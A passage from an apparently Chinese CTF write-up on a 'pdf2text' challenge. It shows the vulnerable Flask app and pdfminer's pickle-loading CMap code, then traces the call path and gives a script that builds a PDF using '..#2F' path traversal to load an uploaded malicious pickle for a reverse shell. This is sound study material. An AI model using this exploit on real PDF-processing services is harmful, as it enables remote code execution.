class="built_in">print</span>(<span class="string">f&quot;Payload执行失败: <span class="subst">&#123;r.status_code&#125;</span> <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/static/out.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取flag失败: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2><span id="pdf2text">pdf2text</span><a href="#pdf2text" class="header-anchor"></a></h2><p>先看看代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>从一个文件里面导入了模块，看看这个文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>队友在这里面找到了load</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_load_data</span>(<span class="params">cls, name: <span class="built_in">str</span></span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    name = name.replace(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filename = <span class="string">&quot;%s.pickle.gz&quot;</span> % name</span><br><span class="line">    log.debug(<span class="string">&quot;loading: %r&quot;</span>, name)</span><br><span class="line">    cmap_paths = (</span><br><span class="line">        os.environ.get(<span class="string">&quot;CMAP_PATH&quot;</span>, <span class="string">&quot;/usr/share/pdfminer/&quot;</span>),</span><br><span class="line">        os.path.join(os.path.dirname(__file__), <span class="string">&quot;cmap&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">for</span> directory <span class="keyword">in</span> cmap_paths:</span><br><span class="line">        path = os.path.join(directory, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">            gzfile = gzip.<span class="built_in">open</span>(path)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">type</span>(<span class="built_in">str</span>(name), (), pickle.loads(gzfile.read()))</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                gzfile.close()</span><br><span class="line">    <span class="keyword">raise</span> CMapDB.CMapNotFound(name)</span><br></pre></td></tr></table></figure>

<p>完全可控，所以生成恶意的tar.gz和PDF文件上传即可，但是都是需要伪造成pdf文件才能够上传的，第一步生成一个有恶意opcode的n4c1.pickle.gz，然后最后的PDF还需要去解析&#x2F;app&#x2F;uploads&#x2F;n4c1，就可以成功反弹shell了</p>
<p>生成pdf去加载opcode</p>
<p>构造思路, 全局搜索 _load_data方法</p>
<p><img src="../images/2025-WMCTF/2.png" alt="img"></p>
<p>有两处触发点, 这里选用get_cmap, 继续往上找, 可以找到以下调用路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extract_pages</span><br><span class="line">        PDFPageInterpreter#process_page</span><br><span class="line">                PDFPageInterpreter#render_contents</span><br><span class="line">                        PDFPageInterpreter#process_page</span><br><span class="line">                                PDFPageInterpreter#render_contents</span><br><span class="line">                                        PDFPageInterpreter#init_resources</span><br><span class="line">                                                PDFResourceManager#get_font</span><br><span class="line">                                                        PDFCIDFont#__init__</span><br><span class="line">                                                                PDFCIDFont#get_cmap_from_spec</span><br><span class="line">                                                                        CMapDB.get_cmap(cmap_name)</span><br><span class="line">                                                                            _load_data</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>extract_pages就是题目调用的地方</p>
<p>通过调试发现最后_load_data的参数是由&#x2F;Encoding控制的, 此外pdf中使用 # 来转义一个16进制数, 这样就可以使用 ..#2F构造出 ..&#x2F; , 避免与pdf中符号 &#x2F; 表示名字对象冲突 </p>
<p>genPDF.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"><span class="comment"># This script hardcodes and generates a small PDF containing a variety of</span></span><br><span class="line"><span class="comment"># page-content operators (graphics, text, state) so you can step through</span></span><br><span class="line"><span class="comment"># pdfminer.six extract_pages() and observe how each operator is handled.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Output: samples/debug_ops.pdf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Key points to help debugging pdfminer internals:</span></span><br><span class="line"><span class="comment"># - The font is a Type0 + CIDFont with /Encoding /GB-EUC-H to trigger</span></span><br><span class="line"><span class="comment">#   CMapDB.get_cmap(&#x27;GB-EUC-H&#x27;) and thus CMapDB._load_data when not cached.</span></span><br><span class="line"><span class="comment"># - The content stream includes operators: q/Q, cm, w, RG, rg, m, l, h, S,</span></span><br><span class="line"><span class="comment">#   re, f, BT/ET, Tf, Td, Tm (implicit via Td), Tj, TJ.</span></span><br><span class="line"><span class="comment"># - Chinese text bytes &lt;D6D0B9FA&gt; represent &quot;中国&quot; in GB2312, so with</span></span><br><span class="line"><span class="comment">#   /Encoding /GB-EUC-H pdfminer will consult the CMap.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_pdf_bytes</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    bio = BytesIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">w</span>(<span class="params">s: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        pos = bio.tell()</span><br><span class="line">        bio.write(s)</span><br><span class="line">        <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Collect objects then build xref.</span></span><br><span class="line">    objects: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">bytes</span>]] = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Catalog</span></span><br><span class="line">    objects.append(</span><br><span class="line">        (</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Pages</span></span><br><span class="line">    objects.append(</span><br><span class="line">        (</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. Type0 Font with GB-EUC-H encoding to trigger CMap loading</span></span><br><span class="line">    font_type0 = (</span><br><span class="line">        <span class="number">4</span>,</span><br><span class="line">        (</span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /Type0 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span></span><br><span class="line">            <span class="comment"># b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Ftmp#2Fn4c1&quot;</span></span><br><span class="line">            <span class="string">b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fn4c1&quot;</span></span><br><span class="line">            <span class="string">b&quot;/DescendantFonts [6 0 R] &gt;&gt;&quot;</span></span><br><span class="line">        ),</span><br><span class="line">    )</span><br><span class="line">    objects.append(font_type0)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. CIDFont descendant with GB1 registry</span></span><br><span class="line">    cidfont = (</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        (</span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /CIDFontType0 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span></span><br><span class="line">            <span class="string">b&quot;/CIDSystemInfo &lt;&lt; /Registry (n4c1222) /Ordering (n4c1_2) /Supplement 5 &gt;&gt; &quot;</span></span><br><span class="line">            <span class="string">b&quot;/DW 1000 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/FontDescriptor &lt;&lt; &quot;</span></span><br><span class="line">            <span class="string">b&quot;/Type /FontDescriptor &quot;</span></span><br><span class="line">            <span class="string">b&quot;/FontName /DebugCID &quot;</span></span><br><span class="line">            <span class="string">b&quot;/FontBBox [0 -200 1000 900] &quot;</span>  <span class="comment"># 必须是四个数字</span></span><br><span class="line">            <span class="string">b&quot;/Ascent 800 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/Descent -200 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/CapHeight 700 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/Flags 32 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/ItalicAngle 0 &quot;</span></span><br><span class="line">            <span class="string">b&quot;/StemV 80 &quot;</span></span><br><span class="line">            <span class="string">b&quot;&gt;&gt;&quot;</span></span><br><span class="line">            <span class="string">b&quot;&gt;&gt;&quot;</span></span><br><span class="line">        ),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    objects.append(cidfont)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. Page content stream — includes a variety of operators</span></span><br><span class="line">    <span class="comment"># Note: GB2312 for 中国 is D6 D0 B9 FA</span></span><br><span class="line">    content_ops = <span class="string">b&quot;\n&quot;</span>.join(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;q&quot;</span>,  <span class="comment"># save graphics state</span></span><br><span class="line">            <span class="string">b&quot;1 0 0 1 0 0 cm&quot;</span>,  <span class="comment"># identity CTM (explicit)</span></span><br><span class="line">            <span class="string">b&quot;0.75 w&quot;</span>,  <span class="comment"># line width</span></span><br><span class="line">            <span class="string">b&quot;0 0 1 RG&quot;</span>,  <span class="comment"># stroke color = blue</span></span><br><span class="line">            <span class="string">b&quot;1 0 0 rg&quot;</span>,  <span class="comment"># fill color = red</span></span><br><span class="line">            <span class="string">b&quot;100 600 m&quot;</span>,  <span class="comment"># move to</span></span><br><span class="line">            <span class="string">b&quot;200 650 l&quot;</span>,  <span class="comment"># line to</span></span><br><span class="line">            <span class="string">b&quot;300 600 l&quot;</span>,  <span class="comment"># line to</span></span><br><span class="line">            <span class="string">b&quot;h&quot;</span>,  <span class="comment"># close path</span></span><br><span class="line">            <span class="string">b&quot;S&quot;</span>,  <span class="comment"># stroke</span></span><br><span class="line">            <span class="string">b&quot;100 500 150 40 re&quot;</span>,  <span class="comment"># rectangle</span></span><br><span class="line">            <span class="string">b&quot;f&quot;</span>,  <span class="comment"># fill</span></span><br><span class="line">            <span class="string">b&quot;BT&quot;</span>,  <span class="comment"># begin text</span></span><br><span class="line">            <span class="string">b&quot;/F1 24 Tf&quot;</span>,  <span class="comment"># font + size</span></span><br><span class="line">            <span class="string">b&quot;100 700 Td&quot;</span>,  <span class="comment"># move text position</span></span><br><span class="line">            <span class="string">b&quot;&lt;48656C6C6F20504446&gt; Tj&quot;</span>,  <span class="comment"># &quot;Hello PDF&quot;</span></span><br><span class="line">            <span class="string">b&quot;0 -30 Td&quot;</span>,  <span class="comment"># next line down</span></span><br><span class="line">            <span class="string">b&quot;&lt;D6D0B9FA&gt; Tj&quot;</span>,  <span class="comment"># &quot;中国&quot; in GB2312; mapped via GB-EUC-H</span></span><br><span class="line">            <span class="string">b&quot;-50 -40 Td&quot;</span>,  <span class="comment"># move</span></span><br><span class="line">            <span class="string">b&quot;[(AB) -50 (&lt;20&gt;) 100 (CD)] TJ&quot;</span>,  <span class="comment"># kerning array example</span></span><br><span class="line">            <span class="string">b&quot;ET&quot;</span>,  <span class="comment"># end text</span></span><br><span class="line">            <span class="string">b&quot;Q&quot;</span>,  <span class="comment"># restore graphics state</span></span><br><span class="line">            <span class="string">b&quot;&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    stream = <span class="string">b&quot;stream\n&quot;</span> + content_ops + <span class="string">b&quot;\nendstream&quot;</span></span><br><span class="line">    content_len = <span class="built_in">len</span>(stream) - <span class="built_in">len</span>(<span class="string">b&quot;stream\n&quot;</span>) - <span class="built_in">len</span>(<span class="string">b&quot;\nendstream&quot;</span>)</span><br><span class="line">    content_obj = (</span><br><span class="line">        <span class="number">5</span>,</span><br><span class="line">        <span class="string">b&quot;&lt;&lt; /Length %d &gt;&gt;\n&quot;</span> % content_len + stream,</span><br><span class="line">    )</span><br><span class="line">    objects.append(content_obj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Page (references content and font resource)</span></span><br><span class="line">    page_dict = (</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        (</span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R &quot;</span></span><br><span class="line">            <span class="string">b&quot;/MediaBox [0 0 612 792] &quot;</span></span><br><span class="line">            <span class="string">b&quot;/Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; &quot;</span></span><br><span class="line">            <span class="string">b&quot;/Contents 5 0 R &gt;&gt;&quot;</span></span><br><span class="line">        ),</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Ensure ordering: add page after fonts and content so refs exist</span></span><br><span class="line">    objects.append(page_dict)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start writing file</span></span><br><span class="line">    w(<span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    offsets: <span class="built_in">dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write each object, record offsets</span></span><br><span class="line">    <span class="keyword">for</span> obj_id, obj_body <span class="keyword">in</span> objects:</span><br><span class="line">        offsets[obj_id] = w(<span class="string">f&quot;<span class="subst">&#123;obj_id&#125;</span> 0 obj\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">        w(obj_body)</span><br><span class="line">        w(<span class="string">b&quot;\nendobj\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># xref</span></span><br><span class="line">    startxref = bio.tell()</span><br><span class="line">    max_obj = <span class="built_in">max</span>(offsets) <span class="keyword">if</span> offsets <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="comment"># xref table requires a free entry 0</span></span><br><span class="line">    w(<span class="string">b&quot;xref\n&quot;</span>)</span><br><span class="line">    w(<span class="string">f&quot;0 <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="comment"># object 0 free</span></span><br><span class="line">    w(<span class="string">b&quot;0000000000 65535 f \n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_obj + <span class="number">1</span>):</span><br><span class="line">        off = offsets.get(i, <span class="number">0</span>)</span><br><span class="line">        w(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n \n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trailer</span></span><br><span class="line">    w(</span><br><span class="line">        (</span><br><span class="line">            <span class="string">b&quot;trailer\n&quot;</span></span><br><span class="line">            + <span class="string">b&quot;&lt;&lt; &quot;</span></span><br><span class="line">            + <span class="string">f&quot;/Size <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span> &quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">            + <span class="string">b&quot;/Root 1 0 R &quot;</span></span><br><span class="line">            + <span class="string">b&quot;&gt;&gt;\n&quot;</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    w(<span class="string">b&quot;startxref\n&quot;</span>)</span><br><span class="line">    w(<span class="string">f&quot;<span class="subst">&#123;startxref&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    w(<span class="string">b&quot;%%EOF\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bio.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    out_dir = os.path.join(os.path.dirname(__file__), os.pardir, <span class="string">&quot;samples&quot;</span>)</span><br><span class="line">    out_dir = os.path.abspath(out_dir)</span><br><span class="line">    os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    out_path = os.path.join(out_dir, <span class="string">&quot;debug_ops.pdf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    data = build_pdf_bytes()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PDF written:&quot;</span>, out_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">len</span>(data), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> out_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 